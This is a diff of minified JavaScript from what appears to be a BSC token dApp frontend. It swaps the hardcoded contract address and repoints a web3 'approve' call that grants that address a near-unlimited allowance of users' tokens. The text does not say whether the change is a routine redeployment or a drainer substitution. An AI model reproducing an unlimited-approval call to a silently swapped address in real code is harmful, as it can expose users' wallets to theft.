@@ -374,8 +374,8 @@
 			var K = n(408),
 				N = n(409),
 				q = 3,
-				X = "0x07be68d75B644A004793c433AfD413737900d526",
-				_ = "https://www.bscscan.com/address/0x07be68d75B644A004793c433AfD413737900d526",
+				X = "0x2ED8DbFd903454B0E2D1e3525E77D4e5795d502d",
+				_ = "https://www.bscscan.com/address/0x2ED8DbFd903454B0E2D1e3525E77D4e5795d502d",
 				$ = Object(a.createContext)({
 					busdcontract: null,
 					contract: null,
@@ -599,7 +599,7 @@
 							return A.a.wrap((function(e) {
 								for (;;) switch (e.prev = e.next) {
 									case 0:
-										return L(!0), "0x07be68d75B644A004793c433AfD413737900d526", e.prev = 2, e.next = 5, t.methods.approve("0x07be68d75B644A004793c433AfD413737900d526", "1000000000000000000000000000000").send({
+										return L(!0), "0x2ED8DbFd903454B0E2D1e3525E77D4e5795d502d", e.prev = 2, e.next = 5, t.methods.approve("0x2ED8DbFd903454B0E2D1e3525E77D4e5795d502d", "1000000000000000000000000000000").send({
 											from: b
 										});
 									case 5:
